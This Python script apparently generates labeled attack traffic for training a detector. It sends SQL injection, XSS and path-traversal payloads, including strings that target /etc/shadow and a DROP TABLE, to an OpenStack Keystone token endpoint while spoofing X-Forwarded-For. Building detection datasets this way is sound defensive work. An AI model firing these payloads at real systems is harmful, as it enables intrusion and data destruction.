#!/usr/bin/env python3
"""
4_attack_webattack.py
=====================
Simulates web attacks against Keystone: SQL injection, XSS, path traversal.

Attack pattern:
- POST requests to /v3/auth/tokens with malicious payloads embedded in
  username or password fields
- Key signal: elevated request_bytes (~2,000 bytes vs normal ~400 bytes)
- 100% failure rate (Keystone rejects malformed auth requests)

Usage:
    python3 4_attack_webattack.py --target 2000
"""

import requests
import time
import random
import csv
import os
import argparse
from datetime import datetime
from config import KEYSTONE_URL, OUTPUT_DIR, LOG_FIELDS, ATTACK_TARGET, ADMIN_DOMAIN

os.makedirs(OUTPUT_DIR, exist_ok=True)

# Malicious payloads
SQL_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1--", "admin'--",
    "' UNION SELECT * FROM users--",
    "'; DROP TABLE users; --",
    "1' AND '1'='1",
    "' OR 'x'='x",
    "admin' #",
    "1; SELECT * FROM information_schema.tables",
]

XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "<svg onload=alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//",
]

PATH_TRAVERSAL = [
    "../../../../etc/passwd",
    "../../../etc/shadow",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]


class RateTracker:
    def __init__(self):
        self.requests = []
        self.fails    = []
        self.times    = []

    def add(self, ts, success, resp_ms):
        cutoff = ts - 60
        self.requests = [t for t in self.requests if t > cutoff]
        self.fails    = [t for t in self.fails    if t > cutoff]
        self.times    = [(t, r) for t, r in self.times if t > cutoff]
        self.requests.append(ts)
        self.times.append((ts, resp_ms))
        if not success:
            self.fails.append(ts)

    def req_rate(self):  return len(self.requests)
    def fail_rate(self): return len(self.fails) / len(self.requests) if self.requests else 0.0


def build_malicious_payload():
    """Build an auth request body with an embedded malicious payload."""
    attack_type = random.choice(["sqli", "xss", "path"])
    if attack_type == "sqli":
        payload_str = random.choice(SQL_PAYLOADS)
    elif attack_type == "xss":
        payload_str = random.choice(XSS_PAYLOADS)
    else:
        payload_str = random.choice(PATH_TRAVERSAL)

    # Embed payload in username or password
    if random.random() < 0.5:
        username = payload_str
        password = "".join(random.choices("abcdef0123456789", k=8))
    else:
        username = "admin"
        password = payload_str

    return {
        "auth": {
            "identity": {
                "methods": ["password"],
                "password": {
                    "user": {
                        "name": username,
                        "domain": {"name": ADMIN_DOMAIN},
                        "password": password,
                    }
                },
            }
        }
    }


def simulate_webattack(target=ATTACK_TARGET, output_file=None):
    if output_file is None:
        output_file = os.path.join(OUTPUT_DIR, "raw_webattack.csv")

    print(f"Web Attack simulation (SQLi + XSS + Path Traversal)")
    print(f"Target: {target} requests → {output_file}\n")

    source_ip    = f"10.0.{random.randint(1, 5)}.{random.randint(1, 20)}"
    tracker      = RateTracker()
    rows         = []
    total        = 0
    recent_times = []

    while total < target:
        body    = build_malicious_payload()
        headers = {
            "Content-Type": "application/json",
            "X-Forwarded-For": source_ip,
        }
        req_bytes = len(str(body)) + len(str(headers))
        ts_start  = time.time()
        try:
            resp       = requests.post(
                f"{KEYSTONE_URL}/v3/auth/tokens",
                json=body, headers=headers, timeout=5)
            resp_ms    = (time.time() - ts_start) * 1000
            status     = resp.status_code
            resp_bytes = len(resp.content)
        except Exception:
            resp_ms    = 1000
            status     = 0
            resp_bytes = 0

        success = 200 <= status < 400
        now     = time.time()
        tracker.add(now, success, resp_ms)
        recent_times.append(resp_ms)
        if len(recent_times) > 20:
            recent_times.pop(0)

        dt   = datetime.now()
        hour = dt.hour
        row  = {
            "timestamp":                dt.isoformat(),
            "hour_of_day":              hour,
            "minute_of_hour":           dt.minute,
            "day_of_week":              dt.weekday(),
            "is_business_hours":        1 if 9 <= hour <= 18 else 0,
            "http_method":              2,
            "endpoint_name":            "/v3/auth/tokens",
            "endpoint_category":        3,
            "path_depth":               3,
            "request_bytes":            req_bytes,
            "response_bytes":           resp_bytes,
            "status_code":              status,
            "status_class":             status // 100 if status > 0 else 0,
            "response_time_ms":         round(resp_ms, 2),
            "is_slow_request":          1 if resp_ms > 500 else 0,
            "is_auth_endpoint":         1,
            "is_admin_endpoint":        0,
            "user_id_hash":             0,
            "has_user_context":         1,
            "req_rate_per_ip_60s":      tracker.req_rate(),
            "fail_rate_per_ip_60s":     round(tracker.fail_rate(), 4),
            "user_req_count_60s":       tracker.req_rate(),
            "avg_response_time_recent": round(
                sum(recent_times) / len(recent_times), 2),
            "has_error_log":            1 if status >= 500 else 0,
            "is_burst":                 0,
            "is_repeated_fail":         1 if tracker.fail_rate() > 0.5 else 0,
            "source_ip":                source_ip,
            "label":                    1,
            "attack_type":              "webattack",
        }
        rows.append(row)
        total += 1

        if total % 200 == 0:
            avg_rb = sum(r["request_bytes"] for r in rows) / len(rows)
            print(f"  [{total}/{target}] "
                  f"avg_request_bytes={avg_rb:.0f} "
                  f"fail_rate={tracker.fail_rate():.1%}")

        time.sleep(random.uniform(0.2, 1.0))

    with open(output_file, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=LOG_FIELDS)
        writer.writeheader()
        writer.writerows(rows)

    avg_rb = sum(r["request_bytes"] for r in rows) / len(rows)
    print(f"\n[DONE] {total} requests written → {output_file}")
    print(f"  Avg request_bytes: {avg_rb:.0f} (normal ~500 — key signal)")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Web attack simulator")
    parser.add_argument("--target", type=int, default=ATTACK_TARGET)
    parser.add_argument("--output", type=str, default=None)
    args = parser.parse_args()
    simulate_webattack(target=args.target, output_file=args.output)
